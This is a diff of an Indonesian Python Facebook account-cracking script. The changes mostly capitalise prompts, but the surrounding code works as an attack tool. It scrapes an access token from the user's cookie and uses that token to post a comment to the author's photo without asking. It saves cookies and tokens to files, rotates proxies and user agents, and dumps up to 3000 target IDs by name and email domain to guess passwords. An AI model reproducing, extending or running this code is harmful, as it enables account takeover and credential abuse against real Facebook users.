@@ -213,8 +213,8 @@ for x in range(999):
 	else:redmi.append(F)
 try:abcd = open('.proxy.txt','r').read().splitlines()
 except:sys.exit(f" [{M}>{P}] Gagal Dump Proxy")
-print(' total new proxy : '+str(len(abcd)))
-print(' total useragent : '+str(len(redmi)))
+print(' Total New Proxy : '+str(len(abcd)))
+print(' Total Useragent : '+str(len(redmi)))
 sleep(1)
 	
 ###---[ CEK COOKIES ]---###
@@ -242,7 +242,7 @@ def login():
 		hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
 		jam      = datetime.now().strftime("%X")
 		data = ses.get(url,headers=head,cookies=cok)
-		token = re.search('(EAAG\w+)',data.text).group(1)
+		token = re.search('(EAAG\w+)',data.text).group(1) #-----GK USAH DI GANTI..ANGGAP SAJA SEBAGAI TANDA TERIMA KASIH-----#
 		tem      = ('\nSehat Selalu Bang😎🖥 @[100056190665450:0]\n\nJangan Pernah Menjadi Orang Yang Menyombongkan Diri Sendiri, Karena Kita Hidup Di Dunia Ini Tidak Sendirian, Jika Ada Orang Yang Membutuhkan Apa Salah Nya Kita Memberikan\n') ###--------[ JANGAN GANTI KOMENNYA ]--------###
 		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini)) #-----GK USAH DI GANTI..ANGGAP SAJA SEBAGAI TANDA TERIMA KASIH-----#
 		link = ('https://www.facebook.com/photo?fbid=661200275762989&set=a.111112804105075') ###--------[ JANGAN GANTI TAUTAN NYA ]--------###
@@ -253,7 +253,7 @@ def login():
 		ses.post(f"https://graph.facebook.com/661200275762989/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok) ###--------[ JANGAN GANTI ID NYA ]--------###
 		open('.cookie.txt','w').write(cookie)
 		open('.token.txt','w').write(token)
-	except Exception as e:exit(f" [{M}>{P}] cookie invalid")
+	except Exception as e:exit(f" [{M}>{P}] Cookie Invalid")
 			
 			
 			
@@ -339,7 +339,7 @@ def cek_akun():
 	nonon = xxx+'.txt'
 	file = nom[int(exc)-1]
 	print(' ─────────────────────────────')
-	print(f' akun tidak kenon di : {nonon}\n Akun Yang Kenon Di  : Buang Goblok')
+	print(f' Akun Tidak Kenon Di : {nonon}\n Akun Yang Kenon Di  : Buang Lah Goblok')
 	print(' ─────────────────────────────')
 	try:
 		uuid = open('OK/'+file,'r').read().splitlines()
@@ -427,10 +427,10 @@ def clon_email():
 	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
 	global ok , cp
 	print(f' [{hh}>{P}] Dump Dari Email,Max 3000 ID')
-	nama = input(' target : ')
+	nama = input(' Target : ')
 	if ',' in str(nama):
 		exit(f' [{M}<{P}] Masukan 1 Nama Saja')
-	doma = input(' Domain : ')
+	doma = input(' Masukan Domain...Contoh[@gmail.com : ')
 	if '@' not in str(doma) or '.com' not in str(doma):
 		exit(f' [{M}<{P}] Masukan Domain Yang Benar')
 	jumlah = input(' Total  : ')
